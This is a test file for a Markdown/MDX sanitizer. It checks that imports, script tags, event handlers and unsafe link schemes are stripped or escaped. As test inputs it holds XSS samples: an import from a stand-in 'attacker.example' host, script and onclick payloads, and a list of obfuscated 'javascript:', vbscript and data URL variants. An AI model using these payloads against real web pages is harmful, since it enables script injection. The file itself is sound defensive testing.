import { describe, expect, it } from 'vitest';
import { normalizePublicMarkdownContent, portablePublicMdxMarkdown } from './public-markdown-content';

describe('public Markdown content normalization', () => {
  it.each(['$&', '$$', "$'", '$`'])('preserves replacement metacharacters in literal public code: %s', (token) => {
    const source = [`Example: \`\`literal ${token}\`\``, '', '~~~mdx', `literal ${token}`, '~~~'].join('\n');
    expect(normalizePublicMarkdownContent(source)).toBe(source);
  });

  it('projects supported MDX while removing executable imports and raw active HTML', () => {
    const source = `import Exploit from "https://attacker.example/exploit.js"

<Callout type="tip">**Portable guidance**</Callout>

<script>globalThis.stolen = true</script>

<Unknown onclick="run()">Readable</Unknown>

\`\`\`mdx
import Example from './example'
<Callout>Code sample</Callout>
\`\`\``;

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('&gt; **Portable guidance**');
    expect(normalized).toContain('&lt;Unknown onclick=&quot;run()&quot;&gt;Readable&lt;/Unknown&gt;');
    expect(normalized).toContain("```mdx\nimport Example from './example'\n<Callout>Code sample</Callout>\n```");
    expect(normalized).not.toContain('Exploit');
    expect(normalized).not.toContain('globalThis.stolen');
    expect(normalized).not.toContain('<script>');
  });

  it('preserves literal HTML and JSON in variable-length inline code spans', () => {
    const source = [
      'Use `<script>alert(1)</script>` with `{"mode":"safe"}` as literal examples.',
      'A double delimiter preserves ``literal `tick`, <tag>, and {value}`` exactly.',
      '<script>globalThis.stolen = true</script>',
    ].join('\n');

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('`<script>alert(1)</script>`');
    expect(normalized).toContain('`{"mode":"safe"}`');
    expect(normalized).toContain('``literal `tick`, <tag>, and {value}``');
    expect(normalized).not.toContain('globalThis.stolen');
  });

  it('keeps tooltip text in parentheses after the inline content', () => {
    expect(portablePublicMdxMarkdown('An <Tooltip tip="Application programming interface">API</Tooltip> call.')).toBe(
      'An API (Application programming interface) call.',
    );
    // Projected like the other attributes: Markdown syntax is escaped, line breaks collapse.
    expect(portablePublicMdxMarkdown('<Tooltip tip="Uses *stars* and\n[links]">term</Tooltip>')).toBe('term (Uses \\*stars\\* and \\[links\\])');
    expect(portablePublicMdxMarkdown('A <Tooltip tip="">term</Tooltip> and a <Tooltip>word</Tooltip>.')).toBe('A term and a word.');
  });

  it('keeps braces in projected attribute text through the whole pipeline, while authored expressions stay out', () => {
    expect(normalizePublicMarkdownContent('<Tooltip tip="Send {id} and {token}">API</Tooltip> with {secretValue}.')).toBe(
      'API (Send \\{id\\} and \\{token\\}) with .',
    );
    expect(normalizePublicMarkdownContent('<ParamField name="items[{index}]" type="string">\n\nOne item.\n\n</ParamField>')).toBe(
      '#### items\\[\\{index\\}\\] · string\n\nOne item.',
    );
    // MDX escapes stay literal; an escaped backslash before an expression does not hide it.
    expect(normalizePublicMarkdownContent('Literal \\{braces\\} and \\\\{hidden}.')).toBe('Literal \\{braces\\} and \\\\.');
  });

  it('decodes the entities the editor writes in attributes once, so they are not escaped twice', () => {
    expect(normalizePublicMarkdownContent('<Tooltip tip="R&amp;D &quot;labs&quot;">API</Tooltip> and R&D.')).toBe(
      'API (R&amp;D &quot;labs&quot;) and R&amp;D.',
    );
    // An entity that was itself escaped stays literal text.
    expect(portablePublicMdxMarkdown('<Tooltip tip="&amp;lt;b&amp;gt;">tag</Tooltip>')).toBe('tag (&lt;b&gt;)');
  });

  it('reads an attribute value containing ">" whole, and escapes it only once', () => {
    expect(portablePublicMdxMarkdown('<Tooltip tip="a > b">API</Tooltip>')).toBe('API (a > b)');
    expect(normalizePublicMarkdownContent('<Tooltip tip="a > b">API</Tooltip>')).toBe('API (a &gt; b)');
    expect(portablePublicMdxMarkdown('<Frame caption="When x > 1">\n\n![Chart](/c.png)\n\n</Frame>')).toBe('![Chart](/c.png)\n\n_When x > 1_');
  });

  it('projects atoms written as an empty pair like self-closing ones', () => {
    expect(portablePublicMdxMarkdown('<FileTree>\n<File name="a.ts"></File>\n<File name="b.ts" />\n</FileTree>')).toBe('- `a.ts`\n- `b.ts`');
    expect(portablePublicMdxMarkdown('Before <Icon icon="star"></Icon><Icon icon="rocket" /> after.')).toBe('Before  after.');
    expect(
      portablePublicMdxMarkdown('<RelatedCard title="A" href="/a" />\n<RelatedCard title="B" description="Second">\n\nBody of B.\n\n</RelatedCard>'),
    ).toBe('- [A](/a)\n- B — Second\n  Body of B.');
  });

  it('leaves components written as examples in code untouched', () => {
    const source = 'Write `<Icon icon="star"></Icon>` inline.\n\n```mdx\n<FileTree>\n<File name="example.ts"></File>\n</FileTree>\n```';
    expect(portablePublicMdxMarkdown(source)).toBe(source);
  });

  it('names a field by its location prop and keeps its flags', () => {
    expect(
      normalizePublicMarkdownContent(
        '<ParamField query="limit" type="integer" required default="10" deprecated>\n\nItems per page.\n\n</ParamField>',
      ),
    ).toBe('#### limit · integer · required · default: 10 · deprecated\n\nItems per page.');
    // A flag's name inside another attribute's value isn't the flag.
    expect(portablePublicMdxMarkdown('<ParamField path="id" description="is required here" required={false}>\n\nText.\n\n</ParamField>')).toBe(
      '#### id\n\nText.',
    );
  });

  it.each([
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    ' java\tscript:alert(1)',
    '&#106;avascript:alert(1)',
    '&#x6A;avascript:alert(1)',
    'javascript&colon;alert(1)',
    'javascript\\:alert(1)',
    'vbscript:x',
    'data:text/html,x',
  ])('projects no link for the unsafe destination %j', (href) => {
    const output = portablePublicMdxMarkdown(
      `<Button href="${href}">Go</Button> <Card title="Card" href="${href}">\n\nBody\n\n</Card> <RelatedCard title="Related" href="${href}" />`,
    );
    expect(output).not.toMatch(/\]\(/);
    expect(output).toContain('Go');
    expect(output).toContain('Card');
    expect(output).toContain('Related');
  });

  it.each(['/guide', 'guide/setup', '#install', 'https://example.com/a?b=1', 'mailto:team@example.com', 'tel:+15550100'])(
    'keeps the safe destination %j',
    (href) => {
      expect(portablePublicMdxMarkdown(`<Button href="${href}">Go</Button>`)).toBe(`[Go](${href})`);
    },
  );

  it('keeps underlined text, and subscript and superscript as plain inline HTML so their meaning survives', () => {
    expect(normalizePublicMarkdownContent('A <u>underlined</u> word, H<sub>2</sub>O and x<sup>2</sup>.')).toBe(
      'A underlined word, H<sub>2</sub>O and x<sup>2</sup>.',
    );
    expect(normalizePublicMarkdownContent('10<SUP>-3</SUP> and x<sub>i</sub>')).toBe('10<sup>-3</sup> and x<sub>i</sub>');
    // Attributes are dropped, and code examples stay literal.
    expect(normalizePublicMarkdownContent('<u class="x">styled</u>, x<sup onclick="alert(1)" class="y">2</sup> and `<u>code</u>`')).toBe(
      'styled, x<sup>2</sup> and `<u>code</u>`',
    );
  });

  it('pairs subscript and superscript across the lines of one paragraph, not across paragraphs', () => {
    expect(normalizePublicMarkdownContent('x<sub>i\nj</sub> done.')).toBe('x<sub>i\nj</sub> done.');
    expect(normalizePublicMarkdownContent('x<sub>i\n\nj</sub>')).toBe('xi\n\nj');
  });

  it('reads formatting tags whose attribute values contain ">" whole', () => {
    expect(normalizePublicMarkdownContent('x<sup title="a > b">2</sup> and <u title=\'c > d\'>under</u>.')).toBe('x<sup>2</sup> and under.');
  });

  it('lets no other markup through subscript or superscript', () => {
    // An unmatched tag keeps only its text.
    expect(normalizePublicMarkdownContent('x<sup>2 and H<sub>2')).toBe('x2 and H2');
    // Anything inside a pair is still escaped.
    expect(normalizePublicMarkdownContent('x<sup><b onmouseover="a()">2</b></sup>')).toBe(
      'x<sup>&lt;b onmouseover=&quot;a()&quot;&gt;2&lt;/b&gt;</sup>',
    );
    // Correctly nested pairs keep their notation; crossed ones keep only what nests.
    expect(normalizePublicMarkdownContent('x<sub>i<sup>2</sup></sub>, a<sub>1<sup>2</sup></sub> and x<sup>a<sub>b</sub>c</sup>')).toBe(
      'x<sub>i<sup>2</sup></sub>, a<sub>1<sup>2</sup></sub> and x<sup>a<sub>b</sub>c</sup>',
    );
    expect(normalizePublicMarkdownContent('a<sub>b<sup>c</sub>d</sup> and e<sub>f</sup>g</sub>')).toBe('ab<sup>cd</sup> and e<sub>fg</sub>');
    // Escaped text that spells a tag is not turned back into one.
    expect(normalizePublicMarkdownContent('&lt;sup&gt;2&lt;/sup&gt;')).toBe('&amp;lt;sup&amp;gt;2&amp;lt;/sup&amp;gt;');
  });
});
